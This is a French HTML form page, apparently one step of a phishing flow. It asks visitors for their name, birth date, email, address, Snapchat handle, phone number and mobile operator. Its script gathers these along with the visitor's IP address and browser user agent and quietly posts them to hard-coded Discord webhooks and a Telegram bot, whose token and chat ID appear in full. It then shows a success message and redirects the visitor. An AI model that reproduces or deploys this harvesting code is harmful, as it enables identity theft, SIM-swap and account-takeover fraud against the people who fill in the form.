<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Formulaire</title>
  <style>
    body {
      background: #2c014d;
      color: #fff;
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .c {
      background: rgba(44,1,77,0.85);
      padding: 30px;
      border-radius: 20px;
      width: 360px;
      text-align: center;
      box-shadow: 0 0 15px #9b00ff;
      border: 2px solid #a54ffb;
    }
    input, button {
      width: 100%;
      margin: 8px 0;
      padding: 12px;
      border: 2px solid #a54ffb;
      border-radius: 10px;
      background: transparent;
      color: white;
      font-size: 16px;
      outline: none;
      box-shadow: inset 0 0 8px #9b00ff;
      transition: 0.3s;
    }
    input:focus {
      border-color: #f7b500;
      box-shadow: 0 0 10px #f7b500;
    }
    button {
      background: #f7b500;
      color: #2c014d;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 0 0 10px #f7b500;
      transition: 0.3s;
    }
    button:hover {
      background: #e0a600;
      box-shadow: 0 0 20px #ffcb3c;
    }
    #msg {
      color: #f88;
      margin-top: 15px;
    }
    label {
      display: block;
      text-align: left;
      margin: 10px 0 5px 0;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="c">
    <h1>Étape 2 : Vos infos</h1>
    <form id="form2">
      <input name="nom" placeholder="Nom" required>
      <input name="prenom" placeholder="Prénom" required>
      <label for="naissance">Date de naissance :</label>
      <input id="naissance" name="naissance" type="date" required>
      <input name="email" type="email" placeholder="Email" required>
      <input name="ville" placeholder="Ville" required>
      <input name="codePostal" placeholder="Code Postal" required>
      <input name="adresse" placeholder="Adresse (facultatif)">
      <input name="snap" placeholder="Nom Snapchat" required>
      <input name="telephone" placeholder="Téléphone (facultatif)">
      <input name="operateur" placeholder="Opérateur" required>
      <button type="submit">Valider</button>
    </form>
    <div id="msg"></div>
  </div>

  <script>
    const DISCORD_WEBHOOK_1 = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
    const DISCORD_WEBHOOK_2 = "https://discord.com/api/webhooks/1402568400475131924/EPF82eqz6XawrnId5YB6nCCXs46u5PuccOkYDlKjm6WddiwWJDB6WnOtMWRCvxE-1Eec";
    const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
    const TELEGRAM_CHAT_ID = "-1002810249796";

    async function getIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip || "IP inconnue";
      } catch {
        return "IP inconnue";
      }
    }

    async function sendDiscord(embed, url) {
      return fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] })
      });
    }

    async function sendTelegram(text) {
      return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text,
          parse_mode: 'Markdown',
          disable_web_page_preview: true
        })
      });
    }

    document.getElementById('form2').addEventListener('submit', async e => {
      e.preventDefault();
      document.getElementById('msg').textContent = "Redirection...";

      const ip = await getIP();
      const ua = navigator.userAgent;

      const d = new FormData(e.target);
      const data = {
        nom: d.get('nom'),
        prenom: d.get('prenom'),
        naissance: d.get('naissance'),
        email: d.get('email'),
        ville: d.get('ville'),
        codePostal: d.get('codePostal'),
        adresse: d.get('adresse'),
        snap: d.get('snap'),
        telephone: d.get('telephone') || 'Non fourni',
        operateur: d.get('operateur') || 'Non fourni'
      };

      // 🎯 Choix du webhook
      let webhookToUse = DISCORD_WEBHOOK_1;
      if (data.operateur.toLowerCase().includes("bouygues") && Math.random() < 0.5) {
        webhookToUse = DISCORD_WEBHOOK_2;
      }

      const discordEmbed = {
        title: "📩 Nouvelle soumission",
        color: 0x9B00FF,
        fields: [
          {
            name: "Informations",
            value:
              `👤 Nom : ${data.nom}\n` +
              `👤 Prénom : ${data.prenom}\n` +
              `🎂 Naissance : ${data.naissance}\n` +
              `📧 Email : ${data.email}\n` +
              `📱 Téléphone : ${data.telephone}\n` +
              `📡 Opérateur : ${data.operateur}\n` +
              `📍 Adresse : ${data.adresse || 'Non fournie'}\n` +
              `🏙️ Ville : ${data.ville} (${data.codePostal})\n` +
              `👻 Snapchat : ${data.snap}\n\n` +
              `🌐 IP : ${ip}\n` +
              `🖥️ User-Agent : ${ua}`
          }
        ],
        timestamp: new Date().toISOString(),
        footer: { text: "Formulaire reçu" }
      };

      const telegramText =
        `📥 *NOUVELLE ENTRÉE* 📥\n\n` +
        `👤 *Nom* : ${data.nom} ${data.prenom}\n` +
        `🎂 *Naissance* : ${data.naissance}\n` +
        `📧 *Email* : ${data.email}\n` +
        `📱 *Téléphone* : ${data.telephone}\n` +
        `📡 *Opérateur* : ${data.operateur}\n` +
        `🏠 *Adresse* : ${data.adresse || 'Non fournie'}, ${data.ville} (${data.codePostal})\n` +
        `👻 *Snapchat* : ${data.snap}\n\n` +
        `🌐 *IP* : ${ip}\n` +
        `🖥️ *User-Agent* : ${ua}`;

      await Promise.all([
        sendDiscord(discordEmbed, webhookToUse),
        sendTelegram(telegramText)
      ]);

      document.getElementById('msg').textContent = "Données envoyées !";
      setTimeout(() => window.location = 'merci.html', 1000);
    });
  </script>
</body>
</html>
